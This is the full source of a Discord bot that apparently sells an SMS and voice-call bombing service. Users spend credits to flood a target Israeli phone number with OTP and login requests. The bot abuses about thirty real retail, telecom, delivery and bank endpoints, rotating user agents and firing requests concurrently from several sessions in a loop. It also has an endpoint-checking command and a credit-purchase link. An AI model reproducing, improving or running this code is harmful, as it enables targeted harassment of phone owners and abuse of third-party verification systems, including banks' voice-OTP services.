import discord
from discord.ext import commands
from discord import app_commands, ui
import asyncio
import aiohttp
import random
import os
import sys
from motor.motor_asyncio import AsyncIOMotorClient
from datetime import datetime, timedelta
import logging
import json

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

MONGO_URI = os.getenv("MONGO_URI")
TOKEN = os.getenv("DISCORD_TOKEN")

if not MONGO_URI or not TOKEN:
    logging.error("❌ Missing environment variables!")
    sys.exit(1)

try:
    cluster = AsyncIOMotorClient(MONGO_URI)
    db = cluster["cyberbot"]
    users_col = db["users"]
    logging.info("✅ Connected to MongoDB on Railway")
except Exception as e:
    logging.error(f"❌ Failed to connect to MongoDB: {e}")
    sys.exit(1)

# ========== רול מורשה ==========
ALLOWED_ROLE_ID = 1480762750052601886

def has_allowed_role():
    async def predicate(interaction: discord.Interaction):
        if not interaction.guild:
            await interaction.response.send_message("❌ הפקודה זמינה רק בשרת!", ephemeral=True)
            return False
        
        member = interaction.user
        if isinstance(member, discord.Member):
            if any(role.id == ALLOWED_ROLE_ID for role in member.roles):
                return True
        
        await interaction.response.send_message(f"❌ רק משתמשים עם רול <@&{ALLOWED_ROLE_ID}> יכולים להשתמש בפקודה זו!", ephemeral=True)
        return False
    return app_commands.check(predicate)

class CyberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        intents.members = True
        super().__init__(command_prefix='!', intents=intents)
        self.start_time = datetime.now()
        self.active_attacks = {}
    
    async def setup_hook(self):
        await self.tree.sync()
        logging.info(f"🔱 OMNI-TOTAL-WAR BOT IS ONLINE")

bot = CyberBot()

# ========== USER AGENTS ==========
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
]

# ========== APIS - מה שעובד ==========
APIS = [
    # מג'נטו
    {"name": "Delta", "url": "https://www.delta.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Gali", "url": "https://www.gali.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Timberland", "url": "https://www.timberland.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Onot", "url": "https://www.onot.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Urbanica", "url": "https://www.urbanica-wh.com/customer/ajax/post/", "type": "magento"},
    {"name": "Castro", "url": "https://www.castro.com/customer/ajax/post/", "type": "magento"},
    {"name": "Hoodies", "url": "https://www.hoodies.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Renoir", "url": "https://www.renuar.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Laline", "url": "https://www.laline.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Gefen", "url": "https://www.gefen.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Avramito", "url": "https://www.avramito.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "RedHot", "url": "https://www.redhot.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Buffalo", "url": "https://www.buffalo.co.il/customer/ajax/post/", "type": "magento"},
    
    # SMS
    {"name": "Cellcom", "url": "https://www.cellcom.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
    {"name": "Partner", "url": "https://www.partner.co.il/api/register", "data": {"phone": "PHONE"}},
    {"name": "Pelephone", "url": "https://www.pelephone.co.il/api/auth", "data": {"phone": "PHONE"}},
    {"name": "Hot", "url": "https://www.hotmobile.co.il/api/verify", "data": {"phone": "PHONE"}},
    {"name": "019", "url": "https://019sms.co.il/api/register", "data": {"phone": "PHONE"}},
    {"name": "Bezeq", "url": "https://www.bezeq.co.il/api/auth", "data": {"phone": "PHONE"}},
    {"name": "Shufersal", "url": "https://www.shufersal.co.il/api/v1/auth/otp", "data": {"phone": "PHONE_RAW"}},
    {"name": "RamiLevi", "url": "https://www.rami-levy.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
    {"name": "10bis", "url": "https://www.10bis.co.il/api/register", "data": {"phone": "PHONE"}},
    {"name": "Wolt", "url": "https://www.wolt.com/api/v1/verify", "data": {"phone": "PHONE"}},
    {"name": "Dominos", "url": "https://www.dominos.co.il/api/auth/sms", "data": {"phone": "PHONE"}},
    {"name": "Yad2", "url": "https://www.yad2.co.il/api/auth/register", "data": {"phone": "PHONE", "action": "send_sms"}},
    {"name": "Pango", "url": "https://api.pango.co.il/auth/otp", "data": {"phoneNumber": "PHONE_RAW"}},
    {"name": "Ivory", "url": "https://www.ivory.co.il/api/register", "data": {"phone": "PHONE"}},
    
    # Voice
    {"name": "Hapoalim", "url": "https://login.bankhapoalim.co.il/api/otp/send", "data": {"phone": "PHONE", "sendVoice": True}},
    {"name": "Leumi", "url": "https://api.leumi.co.il/api/otp/send", "data": {"phone": "PHONE", "voice": True}},
    {"name": "Discount", "url": "https://api.discountbank.co.il/auth/otp", "data": {"phone": "PHONE_RAW", "method": "voice"}},
]

print(f"📊 טענתי {len(APIS)} APIs")

# ========== פונקציות שליחה ==========
async def send_magento(session, url, phone_raw):
    data = {
        "type": "login",
        "telephone": phone_raw,
        "bot_validation": 1,
    }
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest"
    }
    try:
        async with session.post(url, data=data, headers=headers, timeout=5) as resp:
            return resp.status in [200, 201, 202]
    except:
        return False

async def send_api(session, api, phone, phone_raw, phone_intl):
    try:
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        if api.get("type") == "form":
            data = api["data"].replace("PHONE", phone)
            async with session.post(api["url"], data=data, headers=headers, timeout=5) as resp:
                return resp.status in [200, 201, 202, 204]
        else:
            headers["Content-Type"] = "application/json"
            data_str = json.dumps(api["data"])
            data_str = data_str.replace("PHONE", phone).replace("PHONE_RAW", phone_raw).replace("PHONE_INTL", phone_intl)
            data = json.loads(data_str)
            async with session.post(api["url"], json=data, headers=headers, timeout=5) as resp:
                return resp.status in [200, 201, 202, 204]
    except:
        return False

# ========== מתקפה לפי טוקנים (45 שניות לטוקן) ==========
async def token_attack(phone, credits, user_id, interaction, attack_id):
    """כל טוקן = 45 שניות של ספאם"""
    phone_raw = phone[3:] if phone.startswith("972") else phone[1:]
    phone_intl = f"+972{phone_raw}"
    
    duration_seconds = credits * 45
    duration_mins = duration_seconds // 60
    remaining_seconds = duration_seconds % 60
    
    end_time = datetime.now() + timedelta(seconds=duration_seconds)
    
    await interaction.followup.send(
        f"🎯 **SPAM STARTED**\n📱 {phone}\n⏱️ {credits} טוקנים = {duration_mins} דקות ו-{remaining_seconds} שניות\n🎯 {len(APIS)} APIs",
        ephemeral=True
    )
    
    # 5 סשנים
    sessions = [aiohttp.ClientSession() for _ in range(5)]
    total_sent = 0
    last_report = 0
    
    try:
        while datetime.now() < end_time:
            if attack_id in bot.active_attacks and not bot.active_attacks[attack_id]:
                break
            
            tasks = []
            for session in sessions:
                for api in APIS:
                    if api.get("type") == "magento":
                        tasks.append(send_magento(session, api["url"], phone_raw))
                    else:
                        tasks.append(send_api(session, api, phone, phone_raw, phone_intl))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            total_sent += sum(1 for r in results if r is True)
            
            # עדכון כל 30 שניות
            elapsed = int((datetime.now() - (end_time - timedelta(seconds=duration_seconds))).total_seconds())
            if elapsed - last_report >= 30:
                last_report = elapsed
                remaining = duration_seconds - elapsed
                await interaction.followup.send(f"📊 {elapsed}s עברו, {remaining}s נותרו | נשלחו: {total_sent}", ephemeral=True)
            
            await asyncio.sleep(random.uniform(0.3, 0.5))
    
    finally:
        for session in sessions:
            await session.close()
    
    if attack_id in bot.active_attacks:
        del bot.active_attacks[attack_id]
    
    await interaction.followup.send(f"✅ **FINISHED**\n📊 סה\"כ נשלחו: {total_sent} הודעות", ephemeral=True)

# ========== פקודות צוות ==========
@bot.tree.command(name="check", description="בדוק APIs (צוות)")
@app_commands.check(has_allowed_role())
async def check_command(interaction: discord.Interaction):
    await interaction.response.send_message("🔍 בודק 20 APIs...", ephemeral=True)
    
    test_phone = "972501234567"
    test_raw = "0501234567"
    test_intl = "+972501234567"
    
    working = []
    
    async with aiohttp.ClientSession() as session:
        for api in APIS[:20]:
            if api.get("type") == "magento":
                success = await send_magento(session, api["url"], test_raw)
            else:
                success = await send_api(session, api, test_phone, test_raw, test_intl)
            if success:
                working.append(api["name"])
    
    await interaction.followup.send(f"✅ **{len(working)}** עובדים", ephemeral=True)

@bot.tree.command(name="add_tokens", description="הוסף טוקנים (צוות)")
@app_commands.check(has_allowed_role())
async def add_tokens(interaction: discord.Interaction, member: discord.Member, amount: int):
    user_id = str(member.id)
    await users_col.update_one(
        {"user_id": user_id},
        {"$inc": {"tokens": amount}},
        upsert=True
    )
    await interaction.response.send_message(f"✅ הוספת {amount} טוקנים ל{member.mention}", ephemeral=True)

# ========== פאנל ראשי ==========
class SpamModal(ui.Modal, title="Start Spam"):
    phone = ui.TextInput(
        label="Target Phone Number *",
        placeholder="054XXXXXXXX",
        min_length=10,
        max_length=13
    )
    credits = ui.TextInput(
        label="Credits to use (max 100) *",
        placeholder="e.g. 5",
        max_length=3
    )

    async def on_submit(self, interaction: discord.Interaction):
        phone = self.phone.value.strip()
        credits_str = self.credits.value.strip()
        
        # וידוא פורמט מספר
        if not phone.isdigit() or len(phone) < 9:
            await interaction.response.send_message("❌ מספר טלפון לא תקין", ephemeral=True)
            return
        
        if not phone.startswith("05") and not phone.startswith("972"):
            await interaction.response.send_message("❌ מספר חייב להתחיל ב-05 או 972", ephemeral=True)
            return
        
        # וידוא קרדיטים
        try:
            credits = int(credits_str)
            if credits < 1 or credits > 100:
                await interaction.response.send_message("❌ יש להזין 1-100 טוקנים", ephemeral=True)
                return
        except:
            await interaction.response.send_message("❌ מספר לא תקין", ephemeral=True)
            return
        
        user_id = str(interaction.user.id)
        user_doc = await users_col.find_one({"user_id": user_id})
        
        if not user_doc:
            await users_col.insert_one({"user_id": user_id, "tokens": 0})
            user_doc = {"tokens": 0}
        
        if user_doc.get("tokens", 0) < credits:
            await interaction.response.send_message(f"❌ אין לך מספיק טוקנים! יש לך {user_doc.get('tokens', 0)}", ephemeral=True)
            return
        
        # הורדת טוקנים
        await users_col.update_one({"user_id": user_id}, {"$inc": {"tokens": -credits}})
        
        attack_id = f"{user_id}_{datetime.now().timestamp()}"
        bot.active_attacks[attack_id] = True
        
        duration_seconds = credits * 45
        duration_mins = duration_seconds // 60
        remaining_sec = duration_seconds % 60
        
        await interaction.response.send_message(
            f"✅ **SPAM ACTIVATED**\n📱 {phone}\n🎯 {credits} טוקנים = {duration_mins}ד {remaining_sec}ש\n💎 נותרו: {user_doc['tokens'] - credits}",
            ephemeral=True
        )
        
        asyncio.create_task(token_attack(phone, credits, user_id, interaction, attack_id))

class MainPanel(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=180)
    
    @discord.ui.button(label="📱 Spam Phone", style=discord.ButtonStyle.danger, emoji="💣")
    async def spam_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        # לכולם מותר
        await interaction.response.send_modal(SpamModal())
    
    @discord.ui.button(label="💰 My Credits", style=discord.ButtonStyle.secondary, emoji="💎")
    async def credits_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        user_id = str(interaction.user.id)
        user_doc = await users_col.find_one({"user_id": user_id})
        tokens = user_doc.get("tokens", 0) if user_doc else 0
        
        embed = discord.Embed(
            title="💰 Your Credits",
            description=f"You have **{tokens}** credits\n\n1 credit = 45 seconds of spam",
            color=0x00ff00
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
    
    @discord.ui.button(label="🛒 Buy Credits", style=discord.ButtonStyle.link, url="https://your-website.com/buy", emoji="💳")
    async def buy_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        # כפתור לינק - Discord מטפל בזה אוטומטית
        await interaction.response.send_message("🔗 נפתח לינק לרכישה...", ephemeral=True)

@bot.tree.command(name="panel", description="פתח את פאנל השליטה")
@app_commands.check(has_allowed_role())
async def panel(interaction: discord.Interaction):
    embed = discord.Embed(
        title="Spam-Me Control Panel",
        description="Use the buttons below to interact with the bot.\nFor more info go to #info.",
        color=0x2b2d31
    )
    embed.add_field(
        name="📱 **Spam Phone**",
        value="Sending SMS & Call & Whatsapp (costs credits)",
        inline=False
    )
    embed.add_field(
        name="💰 **My Credits**",
        value="Check your balance",
        inline=True
    )
    embed.add_field(
        name="🛒 **Buy Credits**",
        value="Purchase more credits via our website",
        inline=True
    )
    embed.set_footer(text="1 credit = 45 seconds of spam")
    
    view = MainPanel()
    await interaction.response.send_message(embed=embed, view=view)

@bot.tree.command(name="tokens", description="בדוק טוקנים")
async def tokens_command(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    user_doc = await users_col.find_one({"user_id": user_id})
    tokens = user_doc.get("tokens", 0) if user_doc else 0
    await interaction.response.send_message(f"💎 יש לך {tokens} טוקנים (כל טוקן = 45 שניות)", ephemeral=True)

@bot.tree.error
async def on_app_command_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    if isinstance(error, app_commands.CheckFailure):
        pass
    else:
        try:
            await interaction.response.send_message(f"❌ שגיאה: {str(error)}", ephemeral=True)
        except:
            pass

if __name__ == "__main__":
    print(f"🎯 פאנל Spam-Me מוכן עם {len(APIS)} APIs")
    print(f"🔒 רול מורשה: {ALLOWED_ROLE_ID}")
    print(f"⏱️ 1 טוקן = 45 שניות")
    bot.run(TOKEN)
